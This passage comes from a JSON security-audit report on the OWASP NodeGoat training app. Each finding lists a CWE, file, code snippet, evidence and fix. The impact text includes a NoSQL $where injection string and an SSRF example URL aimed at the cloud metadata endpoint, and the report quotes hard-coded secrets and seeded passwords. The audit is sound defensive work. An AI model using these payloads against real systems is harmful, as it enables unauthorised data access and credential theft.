only that value to query allocations, or explicitly verify `req.params.userId === req.session.userId` before querying.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/639.html\",\n      \"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\"\n    ]\n  },\n  {\n    \"id\": \"access-login-no-rate-limit\",\n    \"cwe\": \"CWE-307\",\n    \"owasp\": \"A07:2021 Identification and Authentication Failures\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Login endpoint has no attempt limit, lockout, or delay\",\n    \"file\": \"app/routes/index.js\",\n    \"line\": 34,\n    \"snippet\": \"app.post(\\\"/login\\\", sessionHandler.handleLoginRequest);\",\n    \"evidence\": \"This route has no middleware in front of it at all (compare to every other state-changing route, which at least has `isLoggedIn`). `handleLoginRequest` (app/routes/session.js:53-119) calls `userDAO.validateLogin` directly on every request with no counter, no per-account or per-IP throttle, and no delay; app/data/user-dao.js has no lockout or attempt-tracking field anywhere in `validateLogin` (lines 57-94). server.js's middleware list (lines 68-121: favicon, bodyParser, session, static) contains no rate-limiting package such as `express-rate-limit`, and `package.json`/`node_modules` were checked for one — none is used in server.js.\",\n    \"impact\": \"An attacker can attempt unlimited password guesses against any known username with no throttling, making online brute-force or credential-stuffing attacks against user accounts practical.\",\n    \"fix\": \"Add a per-account and per-IP rate limiter (e.g. `express-rate-limit` or a persisted failed-attempt counter with exponential backoff/lockout) in front of `POST /login`.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/307.html\",\n      \"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"data-002-plaintext-ssn-dob-bank-storage\",\n    \"cwe\": \"CWE-312\",\n    \"owasp\": \"A02:2021 Cryptographic Failures\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"SSN, date of birth and bank account/routing numbers are persisted unencrypted\",\n    \"file\": \"app/data/profile-dao.js\",\n    \"line\": 61,\n    \"endLine\": 66,\n    \"snippet\": \"if (ssn) {\\n            user.ssn = ssn;\\n        }\\n        if (dob) {\\n            user.dob = dob;\\n        }\",\n    \"evidence\": \"updateUser() takes ssn/dob/bankAcc/bankRouting straight from the /profile POST body (app/routes/profile.js handleProfileUpdate, req.body) and assigns them verbatim to the document that users.update() writes at line 78. The encrypt()/decrypt() helpers built on crypto.createCipheriv(config.cryptoAlgo, config.cryptoKey, config.iv) exist only inside the comment block at lines 15-40 and 67-76 (\\\"Fix for A7 - Sensitive Data Exposure\\\") and are never called; getByUserId() at line 94-110 likewise returns the raw stored values with its own decrypt() call commented out at lines 100-105. The values then round-trip in cleartext into the rendered profile form (app/views/profile.html lines 49, 53, 57, 61).\",\n    \"impact\": \"Anyone with read access to the `users` collection - a database backup, a misconfigured export, or an operator - obtains every user's Social Security number, date of birth, bank account number and bank routing number in cleartext; none of this financial/PII data is protected at rest despite the application shipping code intended to encrypt it.\",\n    \"fix\": \"Re-enable the commented encrypt()/decrypt() helpers (using a per-record random IV, not a value stored on the shared config object) before writing ssn/dob/bankAcc/bankRouting to MongoDB, and decrypt only when rendering to the owning user.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/312.html\",\n      \"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-body-parser-dos\",\n    \"cwe\": \"CWE-405\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"body-parser resolves to 1.18.3, a version with two denial-of-service advisories, and is also declared directly (not just pulled in by express)\",\n    \"file\": \"package.json\",\n    \"line\": 9,\n    \"snippet\": \"\\\"body-parser\\\": \\\"^1.15.1\\\",\",\n    \"evidence\": \"package.json declares body-parser at ^1.15.1 as its own top-level dependency; package-lock.json resolves node_modules/body-parser to 1.18.3. npm audit maps this to GHSA-qwcr-r2fm-qrc7 (denial of service when urlencoded parsing is enabled, range <1.20.3, CWE-405) and GHSA-v422-hmwv-36x6 (an invalid `limit` value silently disables size enforcement, range <1.20.6, CWE-770); 1.18.3 falls inside both ranges.\",\n    \"impact\": \"A crafted request body can consume disproportionate CPU/memory during parsing, and a misconfigured or attacker-influenced limit setting can silently remove the size cap meant to bound request bodies, both denying service.\",\n    \"fix\": \"Upgrade body-parser to >=1.20.6; the declared ^1.15.1 range already permits this without any manifest edit -- only the lockfile needs refreshing.\",\n    \"references\": [\n      \"GHSA-qwcr-r2fm-qrc7\",\n      \"GHSA-v422-hmwv-36x6\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-express-redirect-and-transitive\",\n    \"cwe\": \"CWE-601\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"express resolves to 4.16.4, carries its own XSS/open-redirect advisories, and pulls in 6 transitive vulnerable packages (~14 more advisories)\",\n    \"file\": \"package.json\",\n    \"line\": 13,\n    \"snippet\": \"\\\"express\\\": \\\"^4.13.4\\\",\",\n    \"evidence\": \"package.json declares express at ^4.13.4; package-lock.json resolves node_modules/express to 4.16.4. npm audit's own advisories on express are GHSA-qw6h-vgh9-j6wx (XSS via response.redirect(), range <4.20.0) and GHSA-rv95-896h-c2vc (open redirect on malformed URLs, range <4.19.2), both of which contain 4.16.4. Its \\\"via\\\" list additionally names 6 vulnerable packages express pulls in: body-parser, cookie, path-to-regexp, qs, send and serve-static. Deduplicated by GHSA id, those carry roughly 14 further advisories, the largest clusters being 3 ReDoS advisories in path-to-regexp (GHSA-9wv6-86v2-598j, GHSA-rhx6-c78j-4q9w, GHSA-37ch-88jc-xwx2) and 6 prototype-pollution/DoS advisories in qs.\",\n    \"impact\": \"An attacker can redirect a victim to an attacker-controlled origin or inject script through response.redirect() misuse, and the transitive ReDoS advisories in path-to-regexp/qs let a crafted route parameter or query string block the event loop.\",\n    \"fix\": \"Upgrade express to >=4.21.2 (or a verified-compatible 5.x), which pulls in fixed body-parser, qs, path-to-regexp, send and serve-static together.\",\n    \"references\": [\n      \"GHSA-qw6h-vgh9-j6wx\",\n      \"GHSA-rv95-896h-c2vc\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-forever-transitive-critical\",\n    \"cwe\": \"CWE-1321\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"forever resolves to 2.0.0 and pulls in 4 vulnerable transitive packages, including a prototype-pollution advisory in nconf\",\n    \"file\": \"package.json\",\n    \"line\": 15,\n    \"snippet\": \"\\\"forever\\\": \\\"^2.0.0\\\",\",\n    \"evidence\": \"package.json declares forever at ^2.0.0; package-lock.json resolves node_modules/forever to 2.0.0, published 2020-01-05 (forever's own npm history shows no later release under the 2.x line this range permits). npm audit marks forever critical via 4 transitive packages: flatiron (range >=0.1.3), forever-monitor (range *), nconf (range <=0.11.3, itself mapped to GHSA-6xwr-q98w-rvg7, prototype pollution, via its own optimist dependency) and optimist (range >=0.6.0, via minimist). npm audit's fixAvailable requires bumping forever to 4.0.3, a semver-major jump the declared ^2.0.0 range does not permit.\",\n    \"impact\": \"A prototype-pollution payload reaching nconf's config merge can alter object behavior application-wide (potentially escalating to code execution depending on how polluted properties are later used), and the other transitive packages widen the attack surface of the process-management tooling.\",\n    \"fix\": \"Upgrade forever to >=4.0.3 (a breaking manifest change), or, since forever's own last release was in 2017-2020 with long gaps, replace it with a maintained process supervisor (pm2 or a systemd unit) for production process management.\",\n    \"references\": [\n      \"GHSA-6xwr-q98w-rvg7\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-marked-redos-xss\",\n    \"cwe\": \"CWE-1333\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"marked is exact-pinned to 0.3.5 and carries six advisories: two XSS bypasses and four ReDoS issues\",\n    \"file\": \"package.json\",\n    \"line\": 17,\n    \"snippet\": \"\\\"marked\\\": \\\"0.3.5\\\",\",\n    \"evidence\": \"package.json pins marked to the exact string \\\"0.3.5\\\" (no ^ or ~, so npm install will never move it); package-lock.json resolves node_modules/marked to the same 0.3.5. npm audit lists six advisories reachable at this version: GHSA-7px7-7xjx-hxm8 (XSS via data URIs, <0.3.7), GHSA-vfvf-mqq8-rwqc (sanitization bypass via HTML entities, <0.3.6), GHSA-x5pg-88wf-qq4p, GHSA-rrrm-qjm4-v8hf, GHSA-5v2h-r2cx-5xgj and GHSA-p9wx-2529-fp83 (four separate ReDoS advisories, the widest range reaching <4.0.10).\",\n    \"impact\": \"Markdown text rendered by this exact version can trigger catastrophic backtracking (denial of service) or bypass HTML sanitization to inject script content wherever the rendered output is shown to another user.\",\n    \"fix\": \"Move off the exact pin and upgrade marked to >=4.0.10 at minimum (current major is well past that); this is a manifest edit, not just a lockfile refresh, since \\\"0.3.5\\\" permits no `npm update` movement at all.\",\n    \"references\": [\n      \"GHSA-7px7-7xjx-hxm8\",\n      \"GHSA-vfvf-mqq8-rwqc\",\n      \"GHSA-x5pg-88wf-qq4p\",\n      \"GHSA-rrrm-qjm4-v8hf\",\n      \"GHSA-5v2h-r2cx-5xgj\",\n      \"GHSA-p9wx-2529-fp83\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-mongodb-dos\",\n    \"cwe\": \"CWE-400\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"mongodb driver resolves to 2.2.36, a pre-3.1.13 line with a DoS advisory, and pulls in a vulnerable bson via mongodb-core\",\n    \"file\": \"package.json\",\n    \"line\": 18,\n    \"snippet\": \"\\\"mongodb\\\": \\\"^2.1.18\\\",\",\n    \"evidence\": \"package.json declares mongodb at ^2.1.18; package-lock.json resolves node_modules/mongodb to 2.2.36. npm audit maps this to GHSA-mh5c-679w-hh4r (denial of service in mongodb, range <3.1.13, which 2.2.36 is inside) and additionally flags the bundled mongodb-core (resolved <=3.1.1) as vulnerable through its own bson dependency -- one transitive advisory carried in beneath this direct package, beyond the direct one already named.\",\n    \"impact\": \"A crafted server response or document can exhaust resources in the driver's parsing path, denying service to the application; the transitive bson issue widens this to any code path that decodes BSON from an untrusted MongoDB response.\",\n    \"fix\": \"Upgrade mongodb past 3.1.13 at minimum to clear the direct advisory; npm audit's suggested non-breaking-free fix is a major bump to 7.6.0, which also carries a modern, supported driver API.\",\n    \"references\": [\n      \"GHSA-mh5c-679w-hh4r\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-swig-abandoned\",\n    \"cwe\": \"CWE-22\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"swig is pinned to its last-ever release (1.4.2, published 2014), carries an unpatched arbitrary local file read, and is formally deprecated\",\n    \"file\": \"package.json\",\n    \"line\": 22,\n    \"snippet\": \"\\\"swig\\\": \\\"^1.4.2\\\",\",\n    \"evidence\": \"package.json declares swig at ^1.4.2; package-lock.json resolves node_modules/swig to 1.4.2, npm's own registry record for it, and `npm view swig time` shows 1.4.2 was published 2014-08-04 with no later version ever published. npm audit maps this to GHSA-2rq5-699j-x7p6 (arbitrary local file read during template rendering, range <=1.4.2) with `fixAvailable: false` -- there is no non-vulnerable release to move to. `npm view swig deprecated` returns \\\"This package is no longer maintained\\\", confirming the registry itself marks it abandoned, not just old.\",\n    \"impact\": \"If the application's template loader resolves a template name influenced by user input, an attacker can read arbitrary files from the server's filesystem; because no fixed release exists, this risk cannot be closed by upgrading and persists for as long as swig stays in the tree.\",\n    \"fix\": \"There is no fixed version to upgrade to. Replace swig with a maintained template engine reachable through consolidate (e.g. ejs, pug, or nunjucks, the last of which is swig's spiritual successor and is still maintained), and remove the swig dependency entirely.\",\n    \"references\": [\n      \"GHSA-2rq5-699j-x7p6\"\n    ]\n  },\n  {\n    \"id\": \"injection-nosql-where-allocations-threshold\",\n    \"cwe\": \"CWE-943\",\n    \"owasp\": \"A03:2021 Injection\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"NoSQL injection in allocations lookup via unsanitized $where JavaScript\",\n    \"file\": \"app/data/allocations-dao.js\",\n    \"line\": 78,\n    \"snippet\": \"$where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`\",\n    \"evidence\": \"GET /allocations/:userId is routed in app/routes/index.js:63 to allocationsHandler.displayAllocations. app/routes/allocations.js:19-23 reads threshold straight from req.query.threshold with no validation and passes it to allocationsDAO.getByUserIdAndThreshold. There, app/data/allocations-dao.js:78 interpolates threshold verbatim into a MongoDB $where clause, which MongoDB executes as JavaScript on the server for every candidate document; the safe, parseInt-based alternative is left commented out immediately above (lines 63-76).\",\n    \"impact\": \"An attacker who is logged in can supply a threshold value like `1'; return true; var x='` (or an infinite loop) to alter the query's boolean logic and read allocation records for other users, or to cause a denial of service by making the server-side JavaScript evaluate an infinite loop for every document scanned.\",\n    \"fix\": \"Do not build $where from request input. Use a structured query, e.g. { userId: parsedUserId, stocks: { $gt: parseInt(threshold, 10) } } after validating threshold is a bounded integer.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/943.html\",\n      \"https://owasp.org/Top10/A03_2021-Injection/\"\n    ]\n  },\n  {\n    \"id\": \"injection-ssrf-research-symbol\",\n    \"cwe\": \"CWE-918\",\n    \"owasp\": \"A10:2021 Server-Side Request Forgery (SSRF)\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Server-side request forgery in stock research lookup\",\n    \"file\": \"app/routes/research.js\",\n    \"line\": 15,\n    \"endLine\": 16,\n    \"snippet\": \"const url = req.query.url + req.query.symbol;\\n            return needle.get(url, (error, newResponse, body) => {\",\n    \"evidence\": \"GET /research is routed in app/routes/index.js:76 to researchHandler.displayResearch, guarded only by isLoggedIn. app/routes/research.js:14-16 builds the outbound request URL by string-concatenating req.query.url and req.query.symbol with no host allowlist, scheme check, or private-IP block, then calls needle.get(url, ...) with the result and streams the response body back to the client at lines 22-27.\",\n    \"impact\": \"Any authenticated user can direct the server to issue arbitrary outbound HTTP(S) requests, including to internal-only services or the cloud metadata endpoint (e.g. url=http://169.254.169.254/latest/meta-data/), and have the response reflected back to them, enabling internal network reconnaissance and credential theft.\",\n    \"fix\": \"Do not accept a full destination URL from the client. Accept only a stock symbol, build the outbound URL server-side from a fixed, trusted base host, and if a variable host is ever required, validate it against an allowlist and re-resolve/re-check the IP to block RFC1918 and link-local ranges.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/918.html\",\n      \"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\"\n    ]\n  },\n  {\n    \"id\": \"injection-xss-memos-marked-stored\",\n    \"cwe\": \"CWE-79\",\n    \"owasp\": \"A03:2021 Injection\",\n    \"severity\": \"high\",\n    \"confidence\": \"likely\",\n    \"title\": \"Stored XSS in memos via unescaped markdown rendering shared with every user\",\n    \"file\": \"app/views/memos.html\",\n    \"line\": 31,\n    \"snippet\": \"{{ marked(doc.memo) }}\",\n    \"evidence\": \"POST /memos (app/routes/index.js:67, isLoggedIn only) reaches memosHandler.addMemos, which stores req.body.memo verbatim via app/data/memos-dao.js:15-24 with no sanitization. GET /memos then calls memosDAO.getAllMemos(), which returns every user's memos with no per-user filter (app/data/memos-dao.js:26-35), and app/views/memos.html:31 renders each one through the marked() helper (registered as app.locals.marked in server.js:129) inside a swig {{ }} expression while server.js:137 has autoescape globally disabled. server.js:126-128 sets `marked.setOptions({ sanitize: true })`, which strips raw HTML tags from the markdown source, so I did not confirm this specific version (marked 0.3.5, per package.json) still lets a script-executing payload through its markdown-link/image syntax rather than raw HTML tags; that last link in the chain is inferred, not read in marked's own source.\",\n    \"impact\": \"If the sanitize option in this marked version can be bypassed via markdown syntax (e.g. an image or link with a javascript: target), any authenticated user's memo becomes a persistent XSS payload served to every other user who opens /memos, enabling session hijacking or account takeover across the whole user base.\",\n    \"fix\": \"Do not rely on marked's deprecated `sanitize` option. Render markdown to HTML, then pass the output through a maintained HTML sanitizer (e.g. DOMPurify server-side, or `sanitize-html`) immediately before the raw {{ }} render, and re-enable swig autoescaping globally.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/79.html\",\n      \"https://owasp.org/Top10/A03_2021-Injection/\"\n    ]\n  },\n  {\n    \"id\": \"platform-plaintext-http-only\",\n    \"cwe\": \"CWE-319\",\n    \"owasp\": \"A02:2021 Cryptographic Failures\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"The server only ever listens over plain HTTP; the HTTPS setup is fully commented out\",\n    \"file\": \"server.js\",\n    \"line\": 145,\n    \"snippet\": \"http.createServer(app).listen(port, () => {\",\n    \"evidence\": \"Lines 18-28 and 149-155 show the https module, key/cert loading from artifacts/cert/, and an https.createServer(...) call, but all of it is inside block comments. The only listener that actually runs is http.createServer(app).listen(port, ...) at line 145. The login form (app/views/login.html) posts a plaintext password and the session cookie set by express-session (server.js:78-102) is sent over this same unencrypted channel, with no HSTS to upgrade it (see platform-missing-security-headers).\",\n    \"impact\": \"Credentials submitted at POST /login and the session cookie that authenticates every subsequent request travel in cleartext, so any network position between the client and server (shared Wi-Fi, a compromised router, a transparent proxy) can read or replay them.\",\n    \"fix\": \"Terminate TLS at the app (uncomment the https.createServer block and load real certificates, not the checked-in artifacts/cert/server.key) or at a reverse proxy in front of it, and add Strict-Transport-Security once HTTPS is the only entry point.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/319.html\"\n    ]\n  },\n  {\n    \"id\": \"platform-session-cookie-insecure-flags\",\n    \"cwe\": \"CWE-614\",\n    \"owasp\": \"A05:2021 Security Misconfiguration\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"The session cookie is configured with no httpOnly, secure, sameSite, domain, path or expiry, and keeps the default cookie name\",\n    \"file\": \"server.js\",\n    \"line\": 78,\n    \"endLine\": 102,\n    \"snippet\": \"app.use(session({\\n        // genid: (req) => {\\n        //    return genuuid() // use UUIDs for session IDs\\n        //},\\n        secret: cookieSecret,\\n        // Both mandatory in Express v4\\n        saveUninitialized: true,\\n        resave: true\\n        /*\\n        // Fix for A5 - Security MisConfig\\n        // Use generic cookie name\\n        key: \\\"sessionId\\\",\\n        */\\n\\n        /*\\n        // Fix for A3 - XSS\\n        // TODO: Add \\\"maxAge\\\"\\n        cookie: {\\n            httpOnly: true\\n            // Remember to start an HTTPS server to get this working\\n            // secure: true\\n        }\\n        */\\n\\n    }));\",\n    \"evidence\": \"The express-session options object passed here has no cookie block at all: the key: \\\"sessionId\\\" override and the cookie: { httpOnly: true, secure: true } block are both present only as comments (lines 88-90 and 94-100). Because no cookie options are set, express-session falls back to its own defaults: the cookie name stays connect.sid, httpOnly/secure/sameSite are not set on the Set-Cookie header, and no maxAge is set so the cookie never expires on its own.\",\n    \"impact\": \"The session cookie is readable by any script that runs on the page (no httpOnly), is sent over the plaintext HTTP connection this server also runs (no secure, see platform-plaintext-http-only), can be attached to cross-site requests (no sameSite), and the default connect.sid name makes the app trivially fingerprintable as Express by an automated scanner.\",\n    \"fix\": \"Set cookie: { httpOnly: true, secure: true, sameSite: \\\"strict\\\", maxAge: <a bounded value> } and key: \\\"sessionId\\\" (or another non-default name) in the session() options, and only enable secure once the app is served over HTTPS.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/614.html\",\n      \"https://cwe.mitre.org/data/definitions/1004.html\"\n    ]\n  },\n  {\n    \"id\": \"secrets-cookie-secret\",\n    \"cwe\": \"CWE-798\",\n    \"owasp\": \"A07:2021 Identification and Authentication Failures\",\n    \"severity\": \"high\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Express session secret is a hard-coded literal with no environment override\",\n    \"file\": \"config/env/all.js\",\n    \"line\": 8,\n    \"snippet\": \"    cookieSecret: \\\"session_cookie_secret_key_here\\\",\",\n    \"evidence\": \"config/env/all.js is always loaded and merged first by config/config.js (`const config = { ...allConf, ...envConf };`, config.js:10); no environment file (development.js, test.js, production.js) ever sets cookieSecret, and production.js is `module.exports = {};` (empty), so this literal is the value in every environment including production. server.js:17 destructures cookieSecret from config/config, and server.js:82 passes it straight to express-session as `secret: cookieSecret`. Anyone with a copy of this public repository (OWASP NodeGoat) knows the exact string used to sign every session cookie the deployed app issues.\",\n    \"impact\": \"Anyone who has read this open-source repository knows the express-session signing secret used by every deployment that has not overridden it. With that secret they can forge a validly-signed `connect.sid` cookie for any `req.session.userId`, impersonating any user or the admin account without ever authenticating.\",\n    \"fix\": \"Read cookieSecret from a required environment variable with no hard-coded fallback (fail startup if unset), generate a high-entropy random value per deployment, and rotate it; store it in a secrets manager rather than in a committed file.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/798.html\",\n      \"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"access-csrf-disabled-profile-update\",\n    \"cwe\": \"CWE-352\",\n    \"owasp\": \"A01:2021 Broken Access Control\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"State-changing profile update (bank account/routing, SSN, DOB) has no CSRF protection\",\n    \"file\": \"app/routes/index.js\",\n    \"line\": 48,\n    \"snippet\": \"app.post(\\\"/profile\\\", isLoggedIn, profileHandler.handleProfileUpdate);\",\n    \"evidence\": \"server.js requires `csurf` and imports it at line 7 (`// const csrf = require('csurf');`) but the require and every use of it are commented out: the middleware registration at server.js:104-113 (`app.use(csrf()); ... res.locals.csrftoken = req.csrfToken();`) is entirely inside a block comment and never runs, and it is not mounted anywhere else in server.js or app/routes/index.js. The full middleware chain in front of this route is only `isLoggedIn` (index.js:24/47-48); `profileHandler.handleProfileUpdate` (app/routes/profile.js:40-107) reads `firstName, lastName, ssn, dob, address, bankAcc, bankRouting` straight from `req.body` and writes them via `profile.updateUser(...)` with no token or Origin/Referer check anywhere on the path. Authentication is cookie-based session only (server.js:78-102), which a browser attaches automatically to a cross-site request.\",\n    \"impact\": \"A logged-in victim who is lured to an attacker's page can have their bank account number, routing number, SSN, DOB, or address silently changed by a cross-site auto-submitting form, since the browser will attach the victim's session cookie and the server performs no CSRF check.\",\n    \"fix\": \"Re-enable `csurf` (or an equivalent double-submit/`SameSite=Strict` plus Origin check) and mount it in server.js before `routes(app, db)` is called, and render/verify the token on every state-changing form including `/profile`, `/contributions`, `/benefits`, and `/memos`.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/352.html\",\n      \"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\"\n    ]\n  },\n  {\n    \"id\": \"access-login-no-session-regeneration\",\n    \"cwe\": \"CWE-384\",\n    \"owasp\": \"A07:2021 Identification and Authentication Failures\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Session id is not regenerated after successful login (session fixation)\",\n    \"file\": \"app/routes/session.js\",\n    \"line\": 116,\n    \"snippet\": \"req.session.userId = user._id;\",\n    \"evidence\": \"In `handleLoginRequest` (app/routes/session.js:53-119), after `userDAO.validateLogin` succeeds, the code sets `req.session.userId = user._id;` directly on the pre-existing session with no preceding `req.session.regenerate()` call; the comment immediately above, lines 104-115, explicitly documents that this is the known fix and that it is not applied. This is inconsistent with `handleSignup` in the same file, which does call `req.session.regenerate(() => { req.session.userId = user._id; ... })` at lines 234-243. Combined with `saveUninitialized: true` and no `genid` override in the session config (server.js:78-85), a session id assigned before login is preserved and simply promoted to an authenticated one at login.\",\n    \"impact\": \"An attacker who fixes a victim's pre-authentication session id (e.g., by planting a cookie via a subdomain, network position, or a link containing a session id if the app is later changed to accept one) inherits the victim's authenticated session once the victim logs in, without needing the victim's password.\",\n    \"fix\": \"Call `req.session.regenerate()` in `handleLoginRequest` before assigning `req.session.userId`, mirroring the pattern already used in `handleSignup`.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/384.html\",\n      \"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"access-non-constant-time-password-compare\",\n    \"cwe\": \"CWE-916\",\n    \"owasp\": \"A07:2021 Identification and Authentication Failures\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Login compares passwords with plain `===` instead of a hash library's constant-time verify\",\n    \"file\": \"app/data/user-dao.js\",\n    \"line\": 61,\n    \"snippet\": \"return fromDB === fromUser;\",\n    \"evidence\": \"`validateLogin` (app/data/user-dao.js:57-94) defines `comparePassword` at lines 60-67 to do `return fromDB === fromUser;` against the plaintext value fetched from the database at line 91 (`usersCol.findOne({ userName: userName }, validateUserDoc)`); the commented-out replacement at lines 62-66 (`return bcrypt.compareSync(fromDB, fromUser);`) is the intended fix and is not used. JavaScript's `===` on strings short-circuits on the first differing byte, making comparison time a (weak) function of how many leading characters of the guess are correct.\",\n    \"impact\": \"Combined with no rate limiting on the login route (see access-login-no-rate-limit), a network-positioned attacker measuring response timing has a theoretical side channel to narrow down the correct password character by character rather than a purely random search.\",\n    \"fix\": \"Store password hashes (see access-plaintext-password-storage) and verify them with the hashing library's own constant-time compare, e.g. `bcrypt.compareSync(fromUser, fromDB)`.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/916.html\",\n      \"https://cwe.mitre.org/data/definitions/208.html\"\n    ]\n  },\n  {\n    \"id\": \"data-004-hardcoded-crypto-key\",\n    \"cwe\": \"CWE-321\",\n    \"owasp\": \"A02:2021 Cryptographic Failures\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"AES encryption key for PII (cryptoKey) is a hard-coded literal\",\n    \"file\": \"config/env/all.js\",\n    \"line\": 9,\n    \"snippet\": \"cryptoKey: \\\"a_secure_key_for_crypto_here\\\",\",\n    \"evidence\": \"The same config object is spread into every environment via config/config.js; `config.cryptoKey` is the key the commented-out encrypt()/decrypt() helpers in app/data/profile-dao.js (lines 26, 32, 37) are written to use for AES-256 of SSN/DOB. The literal is committed to source control and identical across all deployments.\",\n    \"impact\": \"If the commented-out encryption path in profile-dao.js is ever re-enabled without also changing this key, every deployment shares one publicly-committed AES key, so anyone with repository access could decrypt any tenant's stored SSN/DOB ciphertext.\",\n    \"fix\": \"Generate a random, deployment-specific key at provisioning time, load it from a secret manager or environment variable, and never commit it.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/321.html\",\n      \"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"data-007-seed-script-logs-plaintext-passwords\",\n    \"cwe\": \"CWE-532\",\n    \"owasp\": \"A09:2021 Security Logging and Monitoring Failures\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"Database seed script prints every account's plaintext password to the console\",\n    \"file\": \"artifacts/db-reset.js\",\n    \"line\": 99,\n    \"snippet\": \"USERS_TO_INSERT.forEach((user) => console.log(JSON.stringify(user)));\",\n    \"evidence\": \"USERS_TO_INSERT (lines 12-37) contains the literal passwords \\\"Admin_123\\\", \\\"User1_123\\\" and \\\"User2_123\\\" for the admin and seeded user accounts. Line 99 stringifies and logs the whole user object, password field included, for each entry before they are inserted at line 101. docker-compose.yml's `web` service command (`... node artifacts/db-reset.js && npm start`) runs this script on every container start, so the credentials are written to container stdout/logs on every restart, not just once.\",\n    \"impact\": \"Anyone with access to the container/application logs (docker logs, a log-shipping pipeline, CI output) obtains the admin and seeded user account passwords in plaintext, even if the database itself is otherwise inaccessible to them.\",\n    \"fix\": \"Log only non-secret fields (e.g. userName, _id) when reporting seeded users, or drop this log line entirely.\",\n    \"references\": [\n      \"https://cwe.mitre.org/data/definitions/532.html\",\n      \"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-grunt-devtooling-rce\",\n    \"cwe\": \"CWE-94\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"medium\",\n    \"confidence\": \"confirmed\",\n    \"title\": \"grunt (build/dev tooling) resolves to 1.0.3, inside the range for an arbitrary-code-execution advisory, plus a race condition and a path-traversal advisory\",\n    \"file\": \"package.json\",\n    \"line\": 45,\n    \"snippet\": \"\\\"grunt\\\": \\\"^1.0.3\\\",\",\n    \"evidence\": \"package.json declares grunt at ^1.0.3 under devDependencies; package-lock.json resolves node_modules/grunt to 1.0.3. npm audit maps this to GHSA-m5pj-vjjf-4m3h (arbitrary code execution, range <1.3.0, contains 1.0.3), GHSA-rm36-94g8-835r (race condition, range <1.5.3) and GHSA-j383-35pm-c5h4 (path traversal, range <1.5.2). This package is a devDependency (build/test tooling, not shipped to production), which is why severity is scored medium rather than high or critical despite the advisories' own severities: exploitation requires control over the build/CI environment rather than the deployed application.\",\n    \"impact\": \"Anyone able to influence the build or CI pipeline (a malicious Gruntfile task, a compromised CI job) could achieve code execution or path traversal during the build, rather than at application runtime.\",\n    \"fix\": \"Upgrade grunt to >=1.6.1 or later, which the declared ^1.0.3 range does not permit past 1.x safely for all three advisories -- verify against the specific ranges and bump the manifest accordingly.\",\n    \"references\": [\n      \"GHSA-m5pj-vjjf-4m3h\",\n      \"GHSA-rm36-94g8-835r\",\n      \"GHSA-j383-35pm-c5h4\"\n    ]\n  },\n  {\n    \"id\": \"dependencies-helmet-outdated-major\",\n    \"cwe\": \"CWE-693\",\n    \"owasp\": \"A06:2021 Vulnerable and Outdated Components\",\n    \"severity\": \"medium\",\n    \"confidence\": \"likely\",\n    \"title\": \"helmet is 